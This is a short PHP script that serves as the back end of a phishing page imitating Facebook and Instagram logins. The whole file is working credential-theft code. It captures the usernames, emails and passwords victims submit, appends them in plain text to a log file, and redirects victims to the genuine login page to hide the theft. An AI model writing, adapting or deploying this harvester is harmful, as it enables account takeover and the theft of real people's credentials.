<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Detect either Instagram or Facebook input names
    $user = $_POST['username'] ?? $_POST['email'] ?? 'UNKNOWN_USER';
    $pass = $_POST['password'] ?? $_POST['pass'] ?? 'UNKNOWN_PASS';

    // Determine platform
    $platform = isset($_POST['email']) ? "Facebook" : "Instagram";

    // Build plain text log for file
    $log = "==== [$platform Login] ====\n";
    $log .= "Username: $user\nPassword: $pass\n";
    $log .= "Time: " . date("Y-m-d H:i:s") . "\n";
    $log .= "===========================\n\n";

    // Save to file
    file_put_contents("login.txt", $log, FILE_APPEND);

    // Terminal color output (only if run in terminal/CLI)
    if (php_sapi_name() === 'cli') {
        $color = $platform === "Facebook" ? "\033[34m" : "\033[35m"; // Blue for FB, Magenta for IG
        $reset = "\033[0m";
        echo $color . $log . $reset;
    }

    // Redirect user (must be last and no echo/print before this)
    if ($platform === "Facebook") {
        header("Location: https://m.facebook.com/login");
    } else {
        header("Location: https://www.instagram.com/accounts/login/?hl=en");
    }

    exit();
}
?>
